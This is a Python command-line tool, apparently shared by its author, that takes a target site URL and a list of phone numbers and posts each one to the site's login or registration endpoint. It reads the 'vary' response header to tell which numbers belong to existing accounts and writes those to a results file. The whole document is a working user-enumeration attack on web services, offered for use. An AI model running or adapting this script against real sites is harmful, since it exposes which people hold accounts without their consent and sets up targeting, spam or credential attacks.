#!/usr/bin/env python
from time import sleep
from requests import post
import colorama
from subprocess import run

colorama.init()

def banner():
    
    print(colorama.Fore.WHITE +"""
        
        
                        $$\                           $$\       
                        $$ |                          $$ |      
    $$$$$$\  $$\   $$\ $$$$$$$\   $$$$$$\   $$$$$$$\ $$ |  $$\ 
    $$  __$$\ $$ |  $$ |$$  __$$\  \____$$\ $$  _____|$$ | $$  |
    $$ /  $$ |$$ |  $$ |$$ |  $$ | $$$$$$$ |$$ /      $$$$$$  / 
    $$ |  $$ |$$ |  $$ |$$ |  $$ |$$  __$$ |$$ |      $$  _$$<  
    $$$$$$$  |\$$$$$$$ |$$ |  $$ |\$$$$$$$ |\$$$$$$$\ $$ | \$$\ 
    $$  ____/  \____$$ |\__|  \__| \_______| \_______|\__|  \__|
    $$ |      $$\   $$ |                                        
    $$ |      \$$$$$$  |                                       
    \__|       \______/                                         
                        developer: AbolfazlS-S                                                                                  
                            
        """)
    check_installation_requirements()






def check_installation_requirements():

    installationـquestion =input("installation requirements?  (yes or no)  ")

    if installationـquestion == "yes":

        run("pip install requests ", shell=True)
        run("pip install colorama ", shell=True)

        print("/n/n/n/n/n/")
    attack()    


def attack():


    url = input("\n url site target : ")

    numberList = input('\n   The name of the desired phone number file : (example phone_number.txt) => ')
    name_file = input('\n \n The name of the output file : (example result.txt) => ')

    file = open(name_file, "w" )

    for mobile in open(numberList):

        mobile = mobile.strip("\n")
        response = post(url, data={"mobile": "0"+mobile, "country_code": "+98"})
    
        sleep(1)

        #Checking the phone numbers that exist

        result = response.headers['vary']
        status_codes = response.status_code

        #This phone number does not exist
        if  result ==  "Origin":
            
            print(colorama.Fore.RED + "0"+mobile)
            print("\n",status_codes)
            print("*" * 30)
            
      # This phone number exists      
        elif result == "Accept-Encoding, Origin":
            print(colorama.Fore.GREEN + "0"+mobile)
            print("\n",status_codes)
            print("*" * 30) 
            file = open(name_file, "a" )
            file.writelines(["0"+mobile,"\n  \n"])
    file.close()  
  

           
if __name__=="__main__":
    banner()